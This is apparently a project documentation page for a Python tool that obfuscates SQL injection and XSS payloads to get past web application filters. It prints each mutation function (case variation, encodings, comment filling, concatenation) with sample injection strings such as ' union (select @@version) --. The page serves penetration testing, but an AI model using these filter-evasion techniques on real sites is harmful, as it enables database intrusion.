
---

# **Features** #

---


For SQL injection attack types described in the introduction page there is a tool written by Gerasimos Kassaras (this is me) that can obfuscate SQL payloads (and other payloads), it is the Teenage Mutant Ninja Turtle tool.

The Teenage Mutant Ninja Turtles project supports the following features:

  1. Payload DE-duplication.
  1. Payload base64 encoding.
  1. Payload URL encoding.
  1. Payload UTF-32 encoding.
  1. Payload UTF-16 encoding.
  1. Payload UTF-8 encoding.
  1. Payload GZIP encoding.
  1. Payload BZ2 encoding.
  1. Payload suffix adding.
  1. Payload post-fix adding.
  1. Payload concatenation adding.
  1. Payload hex encoding.
  1. Payload case variation.
  1. Payload file formatting so you can use them with XXSMe firefox plugin.
  1. Payload file formatting so you can use them with SQLInjectMe firefox plugin.
  1. Database clean up from , leading, trailing spaces and double payloads.
  1. Payload collection of the same payload type from the database.

The teenage-mutant-ninja-turtles tool is providing you with an easy way to generate Obfuscated Fuzzing payloads in order to bypass badly implemented Web Application filters (e.t.c SQL Injection filters, XSS Injections filters e.t.c). The tool takes as an input an option and a file name and spits out a file with the obfuscated strings.

## Functions that mutate the original payload file ##

In the following section I will show you part of the script code that implements the most important script functionality:

This function does not do any payload mutation, it only does payload line DE-duplication (e.g. removes double lines):

---

```

def deduplicate(_payloadList):
 
 currentTime = getTime()+'_'
 
 _mutatePayloadFile = currentTime+"deduplicatedPayloads.lst"
 _mutatePayloadFileObj = open(_mutatePayloadFile,"w")
 
 _deduplictedList = list(set(_payloadList))
 
 for line in _deduplictedList:
  _mutatePayloadFileObj.write(line)
  
 _mutatePayloadFileObj.close()

```

---

  * Example of the de-duplicator:

Input payload file content:

  1. ' union (select @@version) --
  1. ' union (select @@version) --
  1. );' union (select @@version) --

Output payload file content:

  1. ' union (select @@version) --
  1. );' union (select @@version) --

**Note**: The tmntv(version) tool will take as an input a single file.

This function adds case variation to SQL injection queries:

---

```

#----------------------------------------------------------------------------------------

def addCaseVarietionToKeyword(_sqlKeyword):

 list1 = list(_sqlKeyword)

 for i in range(len(list1)):
  if i % 2 == 0:
   list1[i] = (list1[i].upper())
  else:
   list1[i] = (list1[i].lower())

 _sqlKeyword = ''.join(list1)

 return str(_sqlKeyword).rstrip()

#----------------------------------------------------------------------------------------

def searchPayloadLine(_keywordList, _payloadLine):
    # Search payload line with all SQL keywords contained in file CharContainer
    for _keyword in _keywordList:
        if re.search(_keyword.upper(),_payloadLine):
            return True
        if re.search(_keyword.lower(),_payloadLine):
            return True
    else:
        return False 

#----------------------------------------------------------------------------------------

def caseVarietionAdder(_payloadList): # Adding case variation
 
 checkDirectoryExitstance() 

 currentTime = getTime()+'_'

 _mutatePayloadFile = currentTime+"caseVarietionPayloads.lst"
 _mutatePayloadFileObj = open(_mutatePayloadFile,"a")
 
 _sqlKeywordElementsFile = sqlKeywordFile
 _sqlKeywordElementsFileObj = open(_sqlKeywordElementsFile,"r")
 _sqlKeywordList = _sqlKeywordElementsFileObj.readlines()
 
 _sqlKeyWordDictionary = {} # Holding SQL keywords mapping them to SQL keywords with case variation
 _searchList = [] # Holding only SQL keywords for later searching
 
 # Populate dictionary with SQL keywords and equvalent SQL keyword values with case variation
 for _sqlKeyword in _sqlKeywordList:
    _sqlKeyWordDictionary[str(_sqlKeyword).rstrip()] = addCaseVarietionToKeyword(_sqlKeyword)

 # Populate list with SQL keywords for searching later on
 for _sqlKeywordKey, _sqlKeywordValue in _sqlKeyWordDictionary.iteritems():
    _searchList.append(_sqlKeywordKey)

 for _payloadLine in  _payloadList:
    for _sqlKeywordKey, _sqlKeywordValue  in _sqlKeyWordDictionary.iteritems():
        if re.search(_sqlKeywordKey.upper(),_payloadLine):
            _payloadLine = str(_payloadLine).replace(_sqlKeywordKey.upper(),_sqlKeywordValue)
            # Search for all keywords within the payload line
            if not searchPayloadLine(_searchList,_payloadLine):
                _mutatePayloadFileObj.write(_payloadLine)
            
        if re.search(_sqlKeywordKey.lower(),_payloadLine):
            _payloadLine = str(_payloadLine).replace(_sqlKeywordKey.lower(),_sqlKeywordValue)
            # Search for all keywords within the payload line
            if not searchPayloadLine(_searchList,_payloadLine):
                _mutatePayloadFileObj.write(_payloadLine)

 _mutatePayloadFileObj.close()

```

---

  * Example of Case Variation Adder:

Input payload file content: ' union (select @@version) --

Output payload file content: ' UnIoN (SeLeCt @@VeRsIoN) --

**Note**: The tmntv(version) tool will take as an input a file, it will then load SQL keywords from the CharContainer/sql\_Keyword\_Container.lst file and generate a payload file with SQL keywords having case variation.

This function adds suffixes such as );-- :

---

```

def suffixAdder(_payloadList): # Adding suffixes
 
 checkDirectoryExitstance() 
 
 currentTime = getTime()+'_'
 
 _mutatePayloadFile = currentTime+"suffixedPayloads.lst"
 _mutatePayloadFileObj = open(_mutatePayloadFile,"w")

 _suffixElementsFile = suffixFile
 _suffixElementObj = open(_suffixElementsFile,"r")
    
 _suffixList = _suffixElementObj.readlines()
 
 for _suffix in _suffixList: 
  for _payloadline in _payloadList:
   _mutatePayloadFileObj.write(str(_suffix).rstrip()+str(_payloadline).rstrip()+"\n")

 _mutatePayloadFileObj.close()

```

---

  * Example of Suffix Adder:

Input payload file content: ' union (select @@version) --

Output payload file content: );' union (select @@version) --

**Note**: The tmntv(version) tool will take as an input a single file.Also the Suffix Adder will read through the SuffixFile and add all listed suffixes.

This function adds postfixes e.g. %00 etc :

---

```

def postfixAdder(_payloadList): # Adding postfixes
    
 checkDirectoryExitstance() 

 currentTime = getTime()+'_'

 _mutatePayloadFile = currentTime = getTime()+'_'+"postfixedPayloads.lst"
 _mutatePayloadFileObj = open(_mutatePayloadFile,"w")

 _postfixElementsFile = postfixFile
 _postfixElementObj = open(_postfixElementsFile,"r")
    
 _postfixList = _postfixElementObj.readlines()
 
 for _postfix in _postfixList: 
  for _payloadline in _payloadList:
    _mutatePayloadFileObj.write(str(_payloadline).rstrip()+str(_postfix).rstrip()+"\n")
    
 _mutatePayloadFileObj.close()

```

---

  * Example of Postfix Adder:

Input payload file content: ' union (select @@version) --

Output payload file content:  ' union (select @@version) --%00

**Note**: The tmntv(version) tool will take as an input a single file. Also the post fix Adder will read through the PostfixFile and add all listed post fixes.

This function does url encoding:

---

```

def urlEncoder(_payloadList): # Do single url encoding 

 currentTime = getTime()+'_'

 _mutatePayloadFile = currentTime = getTime()+'_'+"urlEncodedPayloads.lst"
 _mutatePayloadFileObj = open(_mutatePayloadFile,"w")
 
 for _payloadline in _payloadList:
  _mutatePayloadFileObj.write((urllib.urlencode({'q':str(_payloadline).rstrip()})).replace("q=", "")+"\n")

 _mutatePayloadFileObj.close()

```

---

  * Example of URL Encoder:

Input payload file content: ' union (select @@version) --

Output payload file content: %27+union+%28select+%40%40version%29+--

**Note**: The tmntv(version) tool will take as an input a file.

This function does base 64 encoding:

---

```

def base64Encoder(_payloadList): # Do single Base64 encoding 

 currentTime = getTime()+'_'
 
 _mutatePayloadFile = currentTime+"base64EncodedPayloads.lst"
 _mutatePayloadFileObj = open(_mutatePayloadFile,"w")
 
 for _payloadline in _payloadList:
  _mutatePayloadFileObj.write(base64.b64encode(str(_payloadline).rstrip())+"\n")

 _mutatePayloadFileObj.close()

```

---

  * Example of base64 Encoder:

Input payload file content: ' union (select @@version) --

Output payload file content: JyB1bmlvbiAoc2VsZWN0IEBAdmVyc2lvbikgLS0=

**Note**: The tmntv1.4 tool will take as an input a file.

This function does hexadecimal encoding:

---

```

def hexEncoder(_payloadList): # Do ASCII Hex encoding 

 currentTime = getTime()+'_'

 _mutatePayloadFile =  currentTime +"hexEncodedPayloads.lst"
 _mutatePayloadFileObj = open(_mutatePayloadFile,"w")
 
 for _payloadline in _payloadList:
  _mutatePayloadFileObj.write((str(_payloadline).rstrip()).encode("Hex")+"\n")

 _mutatePayloadFileObj.close()

```

---

  * Example of Hexadecimal Encoder:

Input payload file content: ' union (select @@version) --

Output payload file content: 2720756e696f6e202873656c65637420404076657273696f6e29202d2d

**Note**: The tmntv(version) tool will take as an input a file.

This function does white space filling:

---

```

def replacer(_payloadList): # Filling the gaps 

 currentTime = getTime()+'_'

 _mutatePayloadFile = currentTime+"spaceFilledPayloads.lst"
 _mutatePayloadFileObj = open(_mutatePayloadFile,"w")

 _space_FillerElementsFile = fillerFile
 _space_FillerElementObj = open(_space_FillerElementsFile,"r")
    
 _space_FillerList = _space_FillerElementObj.readlines()
 
 for _space_Filler in _space_FillerList: 
  for _payloadline in _payloadList:
   _mutatePayloadFileObj.write(( _payloadline + '\n' ).replace(" ",_space_Filler.rstrip()))

 _mutatePayloadFileObj.close()

```

---

  * Example of replacer:

Input payload file content: ' union (select @@version) --

Output payload file content: '/SQL COMMENT/union/SQL COMMENT/(select/SQL COMMENT/@@version)//--

**Note**: The tmntv1.4 tool will take as an input a file. The replacer will load the CharContainer/space\_Filler\_Container.lst keywords and replace all spaces from the payload. The filler file contains SQL comments and mutated SQL comments.

This function formats the payload file so you can import it to XXSMe:

---

```

def XSSMeFormater(_payloadList): 

 currentTime = getTime()+'_'

 _mutatePayloadFile =  currentTime = getTime()+'_'+"XSSMeFormated.xml"

 _mutatePayloadFileObj = open(_mutatePayloadFile,"w")
 
 _mutatePayloadFileObj.write("<exportedattacks><attacks><attack><attackString><![CDATA["+"\n")
 
 for _payloadline in _payloadList:
    
    _mutatePayloadFileObj.write((str(_payloadline).rstrip())+"\n"+"]]></attackString><signature>Script</signature></attack><attack><attackString><![CDATA["+"\n")
  
 _mutatePayloadFileObj.write("]]></attackString><signature>Script</signature></attack></attacks></exportedattacks>"+"\n")

 _mutatePayloadFileObj.close()

```

---

  * Example of XSSMeFormater:

Input payload file content: XSS payload line

Output payload file content: xml tags XSSPayload xml tags

**Note**: The tmntv(version) tool will take as an input a single file. The XSSMeFormater will load the input file and spit out an xml file that you can use with XSSMe.

This function formats the payload file so you can import it to SQLInjectMe:

---

```

def SQLInjectMeFormater(_payloadList): 

 currentTime = getTime()+'_'

 _mutatePayloadFile =  currentTime = getTime()+'_'+"SQLInjectMeFormated.xml"
 
 _mutatePayloadFileObj = open(_mutatePayloadFile,"w")

 _mutatePayloadFileObj.write("<exportedattacks><attacks><attack><attackString><![CDATA[")
 
 for _payloadline in _payloadList:
    
    _mutatePayloadFileObj.write((str(_payloadline).rstrip())+"]]></attackString><signature>TMNT</signature></attack><attack><![CDATA[")
  
 _mutatePayloadFileObj.write("</exportedattacks>")

 _mutatePayloadFileObj.close()

```

---

  * Example of SQLInjectMeFormater :

Input payload file content: ' shutdown --

Output payload file content:xml tags' shutdown -- xml tags

**Note**: The tmntv(version) tool will take as an input a single file. The SQLInjectMeFormater will load the input file and spit out an xml file that you can use with SQLInjectMe.


This function mutates the payload by adding concatenation and case variation:

---

```

#----------------------------------------------------------------------------------------

def searchPayloadLineUpperAndLower(_keywordList, _payloadLine):
    # Search payload line for all SQL keywords contained in file CharContainer
    for _keyword in _keywordList:

        if re.search(_keyword.upper(),_payloadLine):

            return True

        if re.search(_keyword.lower(),_payloadLine):

            return True

    else:

        return False 

#----------------------------------------------------------------------------------------
 
def addConcatenationToKeyword(_option,_sqlKeyword): # Add concatenation to a single SQL kerword

 isConcatMSSQL = re.compile("concatMSSQL")
 isConcatOracle = re.compile("concatOracle")
 isConcatMySQL = re.compile("concatMYSQL")
    
 _sqlKeywordAsList = list(_sqlKeyword)

 if isConcatMSSQL.match(_option):# Add the concatenator between the second and third character
    
    _sqlKeywordAsList.insert(1,"\'+\'")

 if isConcatOracle.match(_option):
    
    _sqlKeywordAsList.insert(1,"\'| |\'")

 if isConcatMySQL.match(_option):
    
    _sqlKeywordAsList.insert(1,"\' \'")

 _sqlKeyword = ''.join(_sqlKeywordAsList)

 return str(_sqlKeyword).rstrip()
 
#----------------------------------------------------------------------------------------

def concatenationAdder(_option,_payloadList): # Adding concatenators
 
 checkDirectoryExitstance() 

 currentTime = getTime()+'_'

 _mutatePayloadFile = currentTime+"concatenatedPayloads.lst"

 _mutatePayloadFileObj = open(_mutatePayloadFile,"a")
 
 _sqlKeywordElementsFile = sqlKeywordFile

 _sqlKeywordElementsFileObj = open(_sqlKeywordElementsFile,"r")

 _sqlKeywordList = _sqlKeywordElementsFileObj.readlines()
 
 _sqlKeyWordDictionary = {} # Holding SQL keywords mapping 

 _searchList = [] # Holding only SQL keywords for later searching
 
 # Populate dictionary with SQL keywords and equvalent SQL keyword values
 for _sqlKeyword in _sqlKeywordList:

    _sqlKeyWordDictionary[str(_sqlKeyword).rstrip()] = addConcatenationToKeyword(option,_sqlKeyword)

 # Populate list with SQL keywords for searching later on
 for _sqlKeywordKey, _sqlKeywordValue in _sqlKeyWordDictionary.iteritems():

    _searchList.append(_sqlKeywordKey)

 for _payloadLine in  _payloadList:

    for _sqlKeywordKey, _sqlKeywordValue  in _sqlKeyWordDictionary.iteritems():

        if re.search(_sqlKeywordKey.upper(),_payloadLine):

            _payloadLine = str(_payloadLine).replace(_sqlKeywordKey.upper(),_sqlKeywordValue)

            # Search for all keywords within the payload line
            if not searchPayloadLineUpperAndLower(_searchList,_payloadLine):

                _mutatePayloadFileObj.write(_payloadLine)
            
        if re.search(_sqlKeywordKey.lower(),_payloadLine):

            _payloadLine = str(_payloadLine).replace(_sqlKeywordKey.lower(),_sqlKeywordValue)

            # Search for all keywords within the payload line
            if not searchPayloadLineUpperAndLower(_searchList,_payloadLine):

                _mutatePayloadFileObj.write(_payloadLine)

 _mutatePayloadFileObj.close()

```

---

  * Example of concatenation :

Input payload file content: ' shutdown --

Output payload file content:' sh'+'utdown --

**Note**: The tmntv(version) tool will take as an input a single file. The concatenation function will load the input file and spit out a file that you can use with concatenated payloads.